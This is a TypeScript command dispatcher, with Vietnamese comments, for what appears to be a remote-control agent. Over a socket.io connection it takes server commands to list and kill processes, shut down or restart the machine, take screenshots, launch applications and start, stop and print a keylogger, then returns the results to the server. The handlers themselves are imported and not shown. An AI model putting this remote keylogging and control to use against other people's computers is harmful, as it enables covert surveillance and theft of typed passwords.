// file commandHandler.ts
import { Socket } from "socket.io-client";
import { AgentConfig } from "../config/env.js";
import { logger } from "../utils/logger.js";
// 1. IMPORT HÀM MỚI TỪ CÁC FILE SERVICE
import { listProcesses, killProcess } from "../services/processService.js";
import { shutdownSystem, restartSystem } from "../services/systemService.js";
import { takeScreenshot } from "../services/screenshotService.js";

// ****** 1. IMPORT SERVICE APPLICATIONS ******
import { getApplications, startApplication } from "../services/applicationService.js";
// *******************************************

// ===> BƯỚC 1: IMPORT 3 HÀM TỪ KEYLOGSERVICE <===
import { 
    startKeylogHook, 
    stopKeylogHook, 
    getKeylogPrint 
} from '../services/keylogService.js';
// ===> KẾT THÚC BƯỚC 1 <===


// Import ngôn ngữ CHUẨN
import { RequestMessage, ResponseMessage } from "../protocol.js";

/**
 * Bảng ánh xạ command → handler
 * Tên key ở đây (vd: 'list_processes') phải khớp với
 * 'action' mà Client gửi lên.
 */
const COMMAND_MAP: Record<string, (params?: any) => Promise<any>> = {
    'list_processes': listProcesses,
    'kill_process': async (p) => await killProcess(p?.pid),
    'system_shutdown': shutdownSystem,
    'system_restart': restartSystem,
    'take_screenshot': takeScreenshot,

    // ****** 2. THÊM LỆNH MỚI VÀO ĐÂY ******
    'list_applications': getApplications,
    'start_application': startApplication,
    // **************************************

    // ===> BƯỚC 2: THÊM 3 LỆNH KEYLOGGER VÀO MAP <===
    'keylog_start_hook': startKeylogHook,
    'keylog_stop_unhook': stopKeylogHook,
    'keylog_print_logs': getKeylogPrint,
    // ===> KẾT THÚC BƯỚC 2 <===
};

/**
 * Xử lý lệnh từ server gửi đến.
 */
export async function handleCommand(
    socket: Socket,
    msg: RequestMessage, // <-- Kiểu dữ liệu CHUẨN
    config: AgentConfig
) {
    logger.info(`Received command: ${msg.action}`); // <-- Dùng msg.action

    let result: any;
    let status: ResponseMessage['status'] = 'ok';
    let error: ResponseMessage['error'] = null;

    try {
        const handler = COMMAND_MAP[msg.action]; // <-- Dùng msg.action
        if (handler) {
            result = await handler(msg.payload); // <-- Dùng msg.payload
        } else {
            throw new Error(`Unknown command action: ${msg.action}`);
        }
    } catch (err: any) {
        status = 'error';
        error = { code: 'EXEC_FAILED', message: err.message || "Command failed" };
        result = null; // Không gửi data khi bị lỗi
    }

    // Xây dựng gói tin phản hồi (Response) theo ngôn ngữ CHUẨN
    const response: ResponseMessage = {
        protocolVersion: '1.0',
        id: msg.id, // <-- Phản hồi với ID của request
        type: 'response',
        status: status,
        payload: result, // <-- 'payload' chứa data trả về
        error: error,
        meta: {
            agentId: config.AGENT_ID,
            timestamp: Date.now(),
        },
    };

    // Gửi 'response' về cho Server (Server sẽ chuyển tiếp cho Client)
    socket.emit("response", response);
}